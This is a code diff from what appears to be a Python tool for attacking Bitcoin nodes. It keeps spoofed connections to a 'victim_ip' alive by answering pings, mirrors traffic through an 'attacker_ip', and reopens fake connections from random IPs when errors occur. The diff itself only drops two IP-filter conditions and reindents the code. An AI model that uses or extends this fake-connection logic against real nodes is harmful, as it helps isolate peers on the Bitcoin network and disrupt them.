@@ -288,20 +288,19 @@ def packet_received(msg_raw, socket, mirror_socket, from_ip, from_port, to_ip, t
 	msg = MsgSerializable.from_bytes(msg_raw)
 
 	# Relay Bitcoin packets that aren't from the victim
-	if from_ip == victim_ip:
-		print(f'*** Message received ** {from_ip} --> {to_ip} ** {msg_type}')
-		try:
-			if msg_type == 'ping':
-				pong = msg_pong(bitcoin_protocolversion)
-				pong.nonce = msg.nonce
-				socket.send(pong.to_bytes())
+	print(f'*** Message received ** {from_ip} --> {to_ip} ** {msg_type}')
+	try:
+		if msg_type == 'ping':
+			pong = msg_pong(bitcoin_protocolversion)
+			pong.nonce = msg.nonce
+			socket.send(pong.to_bytes())
 
-		except Exception as e:
-			close_connection(socket, mirror_socket, from_ip, from_port, interface)
-			print("Closing socket because of error: " + str(e))
-			make_fake_connection(rand_ip, victim_ip, False, attempt_number - 1) # Use old IP
-			#make_fake_connection(random_ip(), victim_ip, False, attempt_number - 1)
-			return True # End the thread
+	except Exception as e:
+		close_connection(socket, mirror_socket, from_ip, from_port, interface)
+		print("Closing socket because of error: " + str(e))
+		make_fake_connection(rand_ip, victim_ip, False, attempt_number - 1) # Use old IP
+		#make_fake_connection(random_ip(), victim_ip, False, attempt_number - 1)
+		return True # End the thread
 	return False
 
 def mirror_sniff(socket, orig_socket, src_ip, src_port, dst_ip, dst_port, interface):
@@ -339,18 +338,17 @@ def mirror_packet_received(msg_raw, socket, orig_socket, from_ip, from_port, to_
 	msg = MsgSerializable.from_bytes(msg_raw)
 
 	# Relay Bitcoin packets that aren't from the victim
-	if to_ip == attacker_ip:
-		print(f'*** Mirror message received ** {from_ip} --> {to_ip} ** {msg_type}')
-		try:
-			if msg_type == 'ping':
-				pong = msg_pong(bitcoin_protocolversion)
-				pong.nonce = msg.nonce
-				socket.send(pong.to_bytes())
+	print(f'*** Mirror message received ** {from_ip} --> {to_ip} ** {msg_type}')
+	try:
+		if msg_type == 'ping':
+			pong = msg_pong(bitcoin_protocolversion)
+			pong.nonce = msg.nonce
+			socket.send(pong.to_bytes())
 
-		except Exception as e:	
-			print("Closing socket because of error: " + str(e))
-			socket.close()
-			return True # End the thread
+	except Exception as e:	
+		print("Closing socket because of error: " + str(e))
+		socket.close()
+		return True # End the thread
 
 	""" Relaying code
 	elif packet[IP].dst == attacker_ip:
